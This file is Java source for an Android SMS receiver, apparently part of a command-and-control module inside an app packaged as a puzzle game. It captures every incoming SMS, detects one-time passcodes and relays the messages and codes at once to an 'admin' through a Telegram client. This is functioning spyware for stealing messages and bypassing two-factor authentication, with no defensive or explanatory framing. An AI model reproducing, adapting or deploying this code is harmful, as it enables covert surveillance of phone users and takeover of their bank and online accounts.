package com.gempuzzle.quest.c2.modules;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.gempuzzle.quest.c2.TelegramClient;

/**
 * SMS receiver — forwards all incoming SMS to admin,
 * auto-marks and relays OTPs instantly.
 */
public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras == null) return;
        Object[] pdus = (Object[]) extras.get("pdus");
        if (pdus == null) return;
        StringBuilder sb = new StringBuilder("📨 *INCOMING SMS*\n\n");
        boolean otp = false;
        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
            String from = msg.getOriginatingAddress();
            String body = msg.getMessageBody();
            sb.append("📱 `").append(from).append("`\n").append(body).append("\n\n");
            if (SmsModule.isOtp(body)) {
                otp = true;
                sb.append("🔑 OTP CODE: *").append(SmsModule.extractOtp(body)).append("*\n");
            }
        }
        final String text = otp ? "🔑 *OTP DETECTED — INSTANT RELAY*\n\n" + sb.toString() : sb.toString();
        new Thread(() -> TelegramClient.sendMessage(text)).start();
    }
}
